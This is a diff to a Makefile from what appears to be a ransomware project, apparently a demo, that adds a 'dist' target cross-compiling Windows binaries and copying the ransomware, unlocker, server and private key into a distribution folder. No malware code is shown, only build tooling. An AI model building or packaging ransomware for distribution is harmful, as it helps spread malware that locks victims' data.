@@ -1,4 +1,4 @@
-.PHONY: all deps
+.PHONY: all deps pre-build build clean clean-bin demo-files demo-launcher dist
 
 all: build clean
 
@@ -71,6 +71,12 @@ demo-files:
 	printf 'PNGDATA' > ~/ransomware-demo/photo.png
 	printf 'DBDATA' > ~/ransomware-demo/database.db
 	@echo "Demo files created in ~/ransomware-demo"
+
+# Build the windows binaries and copy them into dist/ for distribution
+dist:
+	$(MAKE) CLIENT_OS=windows CLIENT_ARCH=386 GOOS=windows
+	mkdir -p $(PROJECT_DIR)/dist
+	cp $(BIN_DIR)/ransomware.exe $(BIN_DIR)/unlocker.exe $(BIN_DIR)/server/server.exe $(BIN_DIR)/server/private.pem $(PROJECT_DIR)/dist/
 
 # Create double-click launchers on the Desktop (linux demo, no terminal needed)
 demo-launcher:
